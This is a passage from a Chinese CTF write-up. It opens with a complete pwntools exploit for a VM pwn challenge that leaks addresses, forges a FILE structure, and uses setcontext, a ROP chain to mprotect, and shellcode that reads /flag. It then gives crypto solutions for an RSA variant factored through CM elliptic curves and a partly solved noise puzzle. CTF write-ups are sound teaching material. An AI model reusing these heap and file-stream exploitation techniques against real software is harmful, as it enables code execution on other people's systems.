    ru(b'> \n')

def op(opcode=0, dstReg=0, srcReg=0, off=0, val=0):
    # Opcode
    # 52-55: dstReg
    # 48-51: srcReg
    # 32-47: off
    # 0-31 : val
    param_pack = (dstReg << 52) | (srcReg << 48) | ((off & 0xFFFF) << 32) | (val & 0xFFFFFFFF)

    sl(str(1))
    ru(b'$ \n')

    sl(str(opcode))
    sl(str(param_pack))

def trig_exec():
    sl(b'2')

def dpush(val, reg=0):
    op(8, reg, reg, 0, val & 0xFFFFFFFF) # low
    op(8, reg, reg, 0, val >> 32) # high

op(0, 1, 1, 0xFFFF, 0x008c8c00)
trig_exec()

op()
op(0x10, 1, 1, 0x0000, 0x00000000)
op(0x40, 0, 0, 0x0000, 0x00000000)
trig_exec()
ru(b'Execute result: 0\n')
ru(b'Execute result: ')
pbase = int(ru(b'\n')) - 0x4060
success(hex(pbase))
op(0, 1, 1, 0xFFFF, 0x008b8b00)
trig_exec()
stderr = pbase + 0x4040 + 4
stderr_low = stderr & 0xFFFFFFFF
stderr_high = stderr >> 32
success(hex(stderr_low))
success(hex(stderr_high))
success(hex(stderr))
op(0x0, 0, 0, stderr_high, stderr_low)
trig_exec()
success("pop")
op(0xA, 2, 2, 0, 0)
op(0xA, 3, 3, 0, 0)
trig_exec()
ru(b'Execute result: 129\n')
ru(b'Execute result: ')
libc_high = int(ru(b'\n'))
ru(b'Execute result: ')
libc_low = int(ru(b'\n'))
libc = (libc_high << 32 | libc_low) - 0x2124E0-0x22000
success(hex(libc_high))
success(hex(libc_low))
success(hex(libc))

fake_io = pbase+0x4050
op(8, 0, 0, 0, 0xDeadBeef)
magic_gadget = libc + 0x000000000017A915
_IO_stdfile_2_lock = libc + 0x235780
_IO_wfile_jumps = libc + 0x232228
setcontext = libc + 0x000000000004C0FD
dpush(fake_io)
dpush(0)

# io
fp = IO_FILE_plus_struct()
fp._IO_read_ptr = fake_io + 0x200
fp._IO_write_ptr = 0x1
fp._lock = _IO_stdfile_2_lock
fp.vtable = _IO_wfile_jumps
fp._wide_data = fake_io + 0xF0
fp = bytes(fp)

leave_ret = libc + 0x0000000000029b4c
prdi = libc+0x000000000011b87a
prsi = libc+0x000000000005c207
prdx = libc+0x0000000000048c92
ret = libc +0x0000000000028842
mprotect = libc + 0x0000000000133660
jmp_rdi = libc + 0x000000000011c8d5

groups_little = [
    int.from_bytes(fp[i:i+8], 'little')
    for i in range(0, len(fp), 8)
]

for i, val in enumerate(groups_little):
    print(f"组 {i:2d}: {val:016x}  (small-endian)")

for i, val in enumerate(groups_little):
    dpush(val)

dpush(0)
dpush(0)
# wide_data
for i in range(int(0xe0/8)):
    dpush(0)
dpush(pbase+0x41C0)
dpush(magic_gadget)
trig_exec()
for i in range(4):
    dpush(0)
for i in range(4):
    dpush(0)
dpush(setcontext)
for i in range(10):
    dpush(0)
dpush(fake_io + 0x300) # rbp
for i in range(4):
    dpush(0)
dpush(fake_io + 0x308) # rsp
dpush(leave_ret) # rcx prevent push
trig_exec()

for i in range(11):
    dpush(0)

# rop start
payload = [prdi, pbase + 0x4000, prsi, 0x4000, prdx, 7, mprotect, prdi, pbase+0x43A8, jmp_rdi]

for i in payload:
    dpush(i)
# rop end

shellcode = asm(
shellcraft.open('/flag') +
f"""
mov rdi, rax
mov rsi, {pbase + 0x5000}
mov rdx, 0x100
syscall

mov r13, rsi
mov r10, 20

loop:
test r10, r10
jz loop_end
mov rsi, r13
sub rsp, 128
mov rdi, rsp
xor rax, rax
mov rcx, 16
rep stosq

mov dword ptr [rsp], 35
mov dword ptr [rsp + 8], -1

mov rax, 39
syscall
mov dword ptr [rsp + 16], eax
mov rax, 102
syscall
mov dword ptr [rsp + 20], eax
mov r12, qword ptr [rsi]
mov qword ptr [rsp + 24], r12

mov rax, 129
mov r12, {pbase+0x4010-4}
mov edi, dword ptr [r12]
mov rsi, 35
mov rdx, rsp
syscall

add rsp, 128
add r13, 8
dec r10
jmp loop

loop_end:
ret
""")

pad_len = (8 - len(shellcode) % 8) % 8
shellcode += b'\x00' * pad_len

groups_little = [
    int.from_bytes(shellcode[i:i+8], 'little')
    for i in range(0, len(shellcode), 8)
]

for i, val in enumerate(groups_little):
    print(f"组 {i:2d}: {val:016x}  (small-endian)")

for i, val in enumerate(groups_little):
    dpush(val)

trig_exec()
success('end construction')

stdout = libc + 0x2125C0
stdin = libc + 0x2118E0
pid_addr = pbase + 0x4010

op(0, 1, 1, 0xFCB8 - len(shellcode) - 1, 0x008b8b00)
trig_exec()
op(0x0, 0, 0, pid_addr >> 32, pid_addr & 0xFFFFFFFF)
op(0xA, 4, 4, 0, 0)
trig_exec()
ru(b'Executing task...\n')
ru(b'Execute result: ')
ru(b'Execute result: ')
parent_pid = int(ru(b'\n'))
success('parent_pid: '+ hex(parent_pid))
success(hex(magic_gadget))
op(8, 0, 0, 0, parent_pid)
op(8, 0, 0, 0, 0) # pid

trig_exec()
ru(b'Executing task...')
ru(b'Execute result: ')
while True:
    ru(b'Execute result: ')
    hex_str = hex(int(ru(b'\n')))[2:]
    result = ''.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))[::-1]
    success(result)
    if '}' in result:
        break
ia()
```

## Crypto

### Myrsa

task.py

```python
import gmpy2
from Crypto.Util.number import isPrime, bytes_to_long
from sympy.ntheory import sqrt_mod
from sympy.ntheory.modular import crt
from secret import p, q, r, pp
import os


def oracle(x):
  root_p = sqrt_mod(x, p)
  root_q = sqrt_mod(x, q)
  root_r = sqrt_mod(x, r)
  if root_p is None or root_q is None or root_r is None:
    return "🤐"
  ans, _ = crt([p, q, r], [root_p, root_q, root_r])
  return int(ans)


assert p == pp**2 + 3 * pp + 3 and q == pp**2 + 5 * pp + 7
assert isPrime(p) and isPrime(q) and isPrime(r)

m = bytes_to_long(os.getenv("FLAG", "LilacCTF{fake_flag}").encode().strip())
n = p * q * r
e = 65537
c = pow(m, e, n)

print(f"{n = }")
print(f"{c = }")

while True:
  x = int(input("🧭 > "))
  _, is_psq = gmpy2.iroot(x, 2)
  assert not is_psq, "👿"
  assert 80 < x < 100
  print(oracle(x))
```

第一开始想偏了，害，没有接触过这个知识点

$$
4p = 4pp^2 + 12pp + 12 = (2pp + 3)^2 + 3 = (2pp + 3 + \sqrt{-3})(2pp + 3 - \sqrt{-3}) \
q = p + 2pp + 3
$$

这种形式的素数允许我们构造带复乘(Complex Multiplication, CM)结构的ECC，而我们知道带CM结构的ECC，

CM曲线，D=3 这个曲线方程是

$$
y^2 = x^3 + b
$$

且具有六次twist

并且这个题里面$p=1 \mod 3$，所以六次twist对应了六条曲线，也就是6个不同的b。然后可以渠道g，进而找到我们所需阶数的曲线。

在这个题里面只有96有回显，把96回显的值记为P(4,..)，那么就有$Q.x=k*p$，那么gcd就可以求出p了

exp.py

```python
from sage.all import *
from Crypto.Util.number import long_to_bytes, inverse
# fmt: off
n =
c =
E = EllipticCurve(Zmod(n), [0, 32])
G = E(4, )
p = int(gcd((n*G)[0], n))
pp = var('pp')
p_eq = pp**2 + 3 * pp + 3 - p
print(solve(p_eq, pp))
"""[
pp == ,
pp == -
]
"""
pp =
q = pp**2 + 5 * pp + 7
r = n // (p * q)
m = pow(c, inverse(65537, (p - 1) * (q - 1) * (r - 1)), n)
print(long_to_bytes(m))
```

### Noisy Forest

task.py

```python
import random
import hashlib
from secret import input_str

TOTAL_BITS = 50000
huge_int = random.getrandbits(TOTAL_BITS)
def is_chinese(char):
    return '\u4e00' <= char <= '\u9fa5'

def add_unicode_noise(text, step=100, noise_bits=2):
    noisy_text = ""
    bit_stream_segments = []
    temp_val = huge_int
    num_chunks = (TOTAL_BITS + 31) // 32
    for _ in range(num_chunks):
        chunk_val = temp_val & 0xFFFFFFFF
        bit_stream_segments.append(format(chunk_val, '032b'))
        temp_val >>= 32
    full_bit_stream = "".join(bit_stream_segments)
    stream_ptr = 0
    for char in text:
        if is_chinese(char):
            if stream_ptr + noise_bits > len(full_bit_stream):
                noisy_text += char
                continue
            chunk = full_bit_stream[stream_ptr : stream_ptr + noise_bits]
            noise_val = int(chunk, 2)
            stream_ptr += noise_bits
            original_code = ord(char)
            noisy_text += chr(original_code + (noise_val * step))
        else:
            noisy_text += char
    return noisy_text

step_val = 9997
NOISE_BITS = 1

output_str = add_unicode_noise(input_str, step=step_val, noise_bits=NOISE_BITS)

with open("ciphertext.txt", "w", encoding="utf-8") as f:
    f.write(output_str)

flag_hash = hashlib.sha256(input_str.encode('utf-8')).hexdigest()
print(f"LilacCTF{{{flag_hash}}}")


#

# LilacCTF{df0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

应该是打MT的，但是恢复的时候一直会有几行不成功，尝试把这几行当作未知去进行预测。没写出来，md

## 总结

cry好多不会的，我是fvv，后面有就时间复现吧，先搞一点其他的东西()
